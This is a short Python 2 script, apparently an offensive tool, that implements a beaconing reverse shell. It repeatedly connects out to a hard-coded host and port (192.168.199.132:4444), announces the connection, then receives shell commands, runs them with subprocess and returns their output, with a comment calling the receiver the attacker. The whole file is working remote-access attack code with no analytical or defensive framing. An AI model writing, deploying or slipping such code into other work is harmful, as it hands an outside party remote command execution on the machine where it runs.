#!/usr/bin/python
# imports here
import socket,subprocess,time
HOST = '192.168.199.132'    # The remote host
PORT = 4444            # The same port as used by the server
Timer = 300			# Time between callbacks
starttime = time.time()	#going to use this track when callback should happen
while 1:	#main while loop to cause program to beacon
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	except socket.error as msg:
		s = None
		continue
	try:
		s.connect((HOST, PORT))
	except socket.error as msg:
		s.close()
		s = None
		continue
	# send we are connected
	s.send('[*] Connection Established!')
	# start loop
	while 1: #secondary while loop to respond to commands during a session
		# recieve shell command
     		data = s.recv(1024)
     		# if its quit, then break out and close socket
     		data = data.rstrip('\n')
     		if data == "quit": break
     		# do shell command
     		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     		# read output
     		stdout_value = proc.stdout.read() + proc.stderr.read()
     		# send output to attacker
     		s.send(stdout_value)
		# close socket
	s.close()
